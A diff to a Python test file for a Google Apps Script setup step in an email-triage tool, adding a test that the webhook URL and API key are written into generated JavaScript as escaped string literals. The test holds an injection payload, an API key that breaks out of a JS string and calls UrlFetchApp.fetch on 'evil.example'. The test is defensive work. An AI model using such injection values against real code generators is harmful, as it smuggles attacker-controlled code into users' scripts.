@@ -87,8 +87,8 @@ def test_gas_setup_fallback_prepend(mock_flow, mock_exists, mock_build, mock_inp
         
     update_call_args = mock_service.projects().updateContent.call_args[1]
     code_content = update_call_args["body"]["files"][0]["source"]
-    assert "const JEV_MCP_WEBHOOK_URL = 'https://test.ngrok.app';" in code_content
-    assert "const JEV_MCP_API_KEY = 'test-secret';" in code_content
+    assert 'const JEV_MCP_WEBHOOK_URL = "https://test.ngrok.app";' in code_content
+    assert 'const JEV_MCP_API_KEY = "test-secret";' in code_content
 
 @patch("jev_mcp.email_triage.gas_setup.getpass.getpass")
 @patch("jev_mcp.email_triage.gas_setup.input")
@@ -150,3 +150,26 @@ def test_gas_setup_import_error():
         assert jev_mcp.email_triage.gas_setup.InstalledAppFlow is None
         
     importlib.reload(jev_mcp.email_triage.gas_setup)
+
+
+@patch("jev_mcp.email_triage.gas_setup.build")
+@patch("jev_mcp.email_triage.gas_setup.Path.exists", return_value=True)
+@patch("jev_mcp.email_triage.gas_setup.InstalledAppFlow")
+def test_gas_setup_writes_values_as_escaped_js_string_literals(mock_flow, mock_exists, mock_build):
+    """A quote in the key or URL must not end the JavaScript string it is written into."""
+    import json
+
+    mock_service = MagicMock()
+    mock_build.return_value = mock_service
+    mock_service.projects().create.return_value.execute.return_value = {"scriptId": "12345"}
+    hostile_key = "k'; UrlFetchApp.fetch('https://evil.example'); '"
+    hostile_url = "https://hook.example/a'b"
+
+    with patch("builtins.open", side_effect=FileNotFoundError):
+        setup_gas_workflow(webhook_url=hostile_url, api_key=hostile_key)
+
+    code = mock_service.projects().updateContent.call_args[1]["body"]["files"][0]["source"]
+    assert json.dumps(hostile_key) in code
+    assert json.dumps(hostile_url) in code
+    assert f"'{hostile_key}'" not in code
+    assert f"'{hostile_url}'" not in code
